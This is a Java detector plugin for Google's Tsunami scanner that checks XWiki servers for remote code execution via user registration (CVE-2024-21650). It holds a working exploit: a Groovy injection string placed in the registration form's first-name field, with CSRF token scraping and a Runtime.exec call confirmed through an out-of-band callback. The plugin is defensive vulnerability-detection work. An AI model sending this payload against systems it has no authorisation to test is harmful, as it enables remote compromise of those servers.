package com.google.tsunami.plugins.detectors.rce.cve202421650;

import com.google.common.base.Preconditions;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.util.concurrent.Uninterruptibles;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.plugins.detectors.rce.cve202421650.Annotations.OobSleepDuration;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import java.util.Base64;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects XWiki RCE CVE-2024-21650. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "XWiki RCE CVE-2024-21650 Detector",
    version = "0.1",
    description = "This detector checks for XWiki RCE via user registration (CVE-2024-21650).",
    author = "yuradoc (yuradoc.research@gmail.com)",
    bootstrapModule = Cve202421650DetectorBootstrapModule.class)
public final class Cve202421650Detector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private static final String REQUEST_PATH = "bin/register/XWiki/XWikiRegister";

  private static final String PAYLOAD_PLACEHOLDER =
      "]]{{/html}}{{async}}{{groovy}}{{CMD}}{{/groovy}}{{/async}}";

  private static final Pattern CSRF_TOKEN_PATTERN =
      Pattern.compile("form_token\" value=\"(.*?)\" />");

  private static final String REQUEST_POST_DATA =
      "parent=xwiki:Main.UserDirectory&register_first_name="
          + "{{PAYLOAD_PLACEHOLDER}}"
          + "&register_last_name=&xwikiname="
          + "{{USERNAME}}"
          + "&register_password="
          + "{{PASSWORD}}"
          + "&register2_password="
          + "{{PASSWORD}}"
          + "&register_email="
          + "&form_token={{TOKEN}}";

  private static final String REQUEST_CLEANUP_FIRST_NAME_REPLACEMENT = "Delete Me!";

  private final Clock utcClock;
  private final HttpClient httpClient;
  private final PayloadGenerator payloadGenerator;
  private final int oobSleepDuration;

  Severity vulnSeverity = Severity.HIGH;

  @Inject
  Cve202421650Detector(
      @UtcClock Clock utcClock,
      HttpClient httpClient,
      PayloadGenerator payloadGenerator,
      @OobSleepDuration int oobSleepDuration) {
    this.utcClock = Preconditions.checkNotNull(utcClock);
    this.httpClient = Preconditions.checkNotNull(httpClient);
    this.payloadGenerator = Preconditions.checkNotNull(payloadGenerator);
    this.oobSleepDuration = oobSleepDuration;
  }

  @Override
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(
        Vulnerability.newBuilder()
            .setMainId(
                VulnerabilityId.newBuilder()
                    .setPublisher("TSUNAMI_COMMUNITY")
                    .setValue("CVE-2024-21650"))
            .addRelatedId(
                VulnerabilityId.newBuilder().setPublisher("CVE").setValue("CVE-2024-21650"))
            .setSeverity(vulnSeverity)
            .setTitle("XWiki RCE (CVE-2024-21650)")
            .setDescription(
                "XWiki is vulnerable to a remote code execution (RCE) attack through its user "
                    + "registration feature. This issue allows an attacker to execute "
                    + "arbitrary code by crafting malicious payloads in the \"first name\" "
                    + "or \"last name\" fields during user registration. This impacts all "
                    + "installations that have user registration enabled for guests. This "
                    + "vulnerability has been patched in XWiki 14.10.17, 15.5.3 "
                    + "and 15.8 RC1.")
            .setRecommendation("Update XWiki 14.10.17, 15.5.3 or 15.8 RC1.")
            .build());
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Cve202421650Detector starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(ImmutableList.toImmutableList()))
        .build();
  }

  private String buildRandomString() {
    return Long.toHexString(this.utcClock.instant().toEpochMilli());
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + REQUEST_PATH;

    Payload payload = null;
    String cmd = "";
    if (payloadGenerator.isCallbackServerEnabled()) {
      // Prepare Linux shell RCE for using in payload with callback server.
      PayloadGeneratorConfig config =
          PayloadGeneratorConfig.newBuilder()
              .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
              .setInterpretationEnvironment(
                  PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
              .setExecutionEnvironment(
                  PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
              .build();

      payload = payloadGenerator.generate(config);
      cmd = payload.getPayload();
    }

    String requestUserName = "test" + buildRandomString();

    String requestUserPassword = buildRandomString() + buildRandomString();

    String responseString = "XWiki." + requestUserName + "]] (" + requestUserName + ")";

    String requestCleanupPath =
        "rest/wikis/xwiki/spaces/XWiki/pages/" + requestUserName + "/objects/XWiki.XWikiUsers/0";

    String targetCleanupUri =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + requestCleanupPath;

    String token = "";

    // plain GET request to check user's registration page availability and retrieve csrf form's
    // token.
    try {
      HttpResponse response =
          httpClient.send(HttpRequest.get(targetUri).withEmptyHeaders().build(), networkService);
      if (response.status().code() != HttpStatus.OK.code()) {
        return false;
      }

      // Parse the csrf value.
      Matcher csrfTokenMatcher = CSRF_TOKEN_PATTERN.matcher(response.bodyString().orElse(""));
      if (csrfTokenMatcher.find()) {
        token = csrfTokenMatcher.group(1);
      }

      if (token.isEmpty()) {
        return false;
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to request '%s'.", targetUri);
    }

    // Inject Groovy payload in the first name, pass csrf token, random strings for required fields
    // to form's POST data.
    String requestBody =
        REQUEST_POST_DATA
            .replace("{{USERNAME}}", requestUserName)
            .replace("{{PASSWORD}}", requestUserPassword)
            .replace("{{TOKEN}}", token)
            .replace("{{PAYLOAD_PLACEHOLDER}}", PAYLOAD_PLACEHOLDER)
            .replace("{{CMD}}", !cmd.isEmpty() ? "Runtime.getRuntime().exec(\"" + cmd + "\")" : "");

    try {
      // Main request that performs vulnerability check.
      HttpResponse response =
          httpClient.send(
              HttpRequest.post(targetUri)
                  .setHeaders(
                      HttpHeaders.builder()
                          .addHeader("Content-Type", "application/x-www-form-urlencoded")
                          .build())
                  .setRequestBody(ByteString.copyFromUtf8(requestBody))
                  .build(),
              networkService);

      Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(oobSleepDuration));

      // Update the user's profile by changing the first name to notify the XWiki administrator for
      // account removal, as default settings prevent users from deleting their own profiles.
      httpClient.send(
          HttpRequest.put(targetCleanupUri)
              .setHeaders(
                  HttpHeaders.builder()
                      .addHeader("Content-Type", "application/x-www-form-urlencoded")
                      .addHeader("Accept", "application/xml")
                      .addHeader(
                          "Authorization",
                          "Basic "
                              + Base64.getEncoder()
                                  .encodeToString(
                                      (requestUserName + ":" + requestUserPassword)
                                          .getBytes(StandardCharsets.UTF_8)))
                      .build())
              .setRequestBody(
                  ByteString.copyFromUtf8(
                      "className=XWiki.XWikiUsers&property#first_name="
                          + REQUEST_CLEANUP_FIRST_NAME_REPLACEMENT))
              .build(),
          networkService);

      // Try to use callback server for RCE confirmation and raise severity on success.
      // Otherwise, detect vulnerability through response body matching.
      if (payload != null && payload.checkIfExecuted()) {
        vulnSeverity = Severity.CRITICAL;
        logger.atInfo().log("The remote code execution was confirmed via an out-of-band callback.");
        return true;
      } else if (response.bodyString().isPresent()
          && response.bodyString().get().contains(responseString)) {
        logger.atInfo().log(
            "Since the Tsunami Callback Server was not available, the vulnerability was confirmed"
                + " through response matching.");
        return true;
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to request '%s'.", targetUri);
    }
    return false;
  }

  public DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(this.getAdvisories().get(0))
        .build();
  }
}
